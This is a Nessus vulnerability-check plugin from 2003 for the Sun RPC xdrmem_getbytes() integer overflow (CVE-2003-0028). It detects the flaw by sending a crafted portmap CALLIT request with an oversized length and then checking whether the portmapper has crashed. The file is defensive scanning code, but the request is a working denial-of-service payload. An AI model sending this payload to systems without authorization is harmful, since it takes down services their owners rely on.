#
# This script was written by Renaud Deraison <deraison@nessus.org>
# with using rpc_cmsd_overflow.nasl by Xue Yong Zhi <xueyong@udel.edu>
# as a template
#
# See the Nessus Scripts License for details
#
#
#
# 
# Only works against Solaris. The BSD and GNU portmapper apparently
# don't call xdrmem_getbytes()
#
if(description)
{
 script_id(11420);
 if(defined_func("script_xref"))script_xref(name:"IAVA", value:"2003-t-0007");
 script_bugtraq_id(7123);
 script_version ("$Revision: 1.8 $");
 script_cve_id("CVE-2003-0028");
 
 name["english"] = "Sun portmap xdrmem_getbytes() overflow";
 script_name(english:name["english"]);

 desc["english"] = "
The RPC library has an integer overflow in the function
xdrmem_getbytes(). 

An attacker may use this flaw to execute
arbitrary code on this host with the privileges
your RPC programs are running with (typically, root), by
sending a specially crafted request to them.

Nessus used this flaw to crash your portmapper.

Solution : See http://www.cert.org/advisories/CA-2003-10.html
Risk factor : High";


 script_description(english:desc["english"]);

 summary["english"] = "Checks for the xdrmem_getbytes() overflow";
 script_summary(english:summary["english"]);

 script_category(ACT_DESTRUCTIVE_ATTACK); 


 script_copyright(english:"This script is Copyright (C) 2003 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2003 Renaud Deraison");
 family["english"] = "RPC";
 family["francais"] = "RPC";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("rpc_portmap.nasl");
 script_require_keys("rpc/portmap");
 exit(0);
}

#
# The script code starts here
#


include("misc_func.inc");
include("nfs_func.inc");



function portmap_alive(portmap)
{ 
 local_var	broken, req, soc, r, port;
 local_var	a, b, c, d, p_a, p_b, p_c, p_d, pt_a, pt_b, pt_c, pt_d;
 local_var      program, protocol;
 
 program = 100000;
 protocol = IPPROTO_UDP;
 
 
 a = rand() % 255;
 b = rand() % 255;
 c = rand() % 255;
 d = rand() % 255;
 
 p_a = program / 16777216; 	p_a = p_a % 256;
 p_b = program / 65356; 	p_b = p_b % 256;
 p_c = program / 256;   	p_c = p_c % 256;
 p_d = program % 256;

 pt_a = protocol / 16777216; pt_a = pt_a % 256;
 pt_b = protocol / 65535   ; pt_b = pt_b % 256;
 pt_c = protocol / 256;    ; pt_c = pt_c % 256;
 pt_d = protocol % 256;
 
 
 req = raw_string(a, 	b, 	c, 	d, 	# XID
 		  0x00, 0x00, 0x00, 0x00,	# Msg type: call
		  0x00, 0x00, 0x00, 0x02,	# RPC Version
		  0x00, 0x01, 0x86, 0xA0,	# Program
		  0x00, 0x00, 0x00, 0x02,	# Program version
		  0x00, 0x00, 0x00, 0x03,	# Procedure
		  0x00, 0x00, 0x00, 0x00,	# Credentials - flavor
		  0x00, 0x00, 0x00, 0x00, 	# Credentials - length
		  0x00, 0x00, 0x00, 0x00,	# Verifier - Flavor
		  0x00, 0x00, 0x00, 0x00,	# Verifier - Length
		  
		  p_a,  p_b,  p_c,  p_d,	# Program
		  0xFF, 0xFF, 0xFF, 0xFF,	# Version (any)
		  pt_a, pt_b, pt_c, pt_d,	# Proto (udp)
		  0x00, 0x00, 0x00, 0x00	# Port
 		  );
	
	  
 if(isnull(portmap)){
   port = int(get_kb_item("rpc/portmap"));
   if(port == 0)port = 111;
   }
 else port = portmap;
 	  
	  
 broken = get_kb_item(string("/tmp/rpc/noportmap/", port));
 if(broken)return(0);
 
 	  
 soc = open_sock_udp(port);
 send(socket:soc, data:req);
 r = recv(socket:soc, length:1024);
 close(soc);
 if(!r)return(0);
 else return(port);
}


port = portmap_alive();
if(!port)exit(0);



soc = open_sock_udp(port);
host = this_host_name();

pad = padsz(len:strlen(host));
len = 20 + strlen(host) + pad;
soc = open_sock_udp(port);
req = 	rpclong(val:rand()) +   	#unsigned int xid;
	rpclong(val:0) +      		#msg_type mtype case CALL(0):
	rpclong(val:2) +      		#unsigned int rpcvers;/* must be equal to two (2) */
	rpclong(val:100000) + 		#unsigned int prog(protmap);
	rpclong(val:2) +      		#unsigned int vers(2);
	rpclong(val:5) +      		#unsigned int proc(CALLIT);
	rpclong(val:1) +      		#AUTH_UNIX
	rpclong(val:len) +    		#len
	rpclong(val:rand()) + 		#stamp
	rpclong(val:strlen(host)) +	#length
	host +            		#contents(Machine name)
	rpcpad(pad:pad) +     		#fill bytes
	rpclong(val:0)  +     		#uid
	rpclong(val:0)  +     		#gid
	rpclong(val:0)  +     		#auxiliary gids
	rpclong(val:0)  +     		#AUTH_NULL
	rpclong(val:0)  +
	rpclong(val:100024) +
	rpclong(val:2) +
	rpclong(val:4) +
	raw_string(0xFF, 0xFF, 0xFF, 0xFF) +
	rpclong(val:0) +
	rpclong(val:0);

send(socket:soc, data:req);
r = recv(socket:soc, length:4096);
close(soc);

alive = portmap_alive(portmap:port);
if(!alive)security_hole(port);
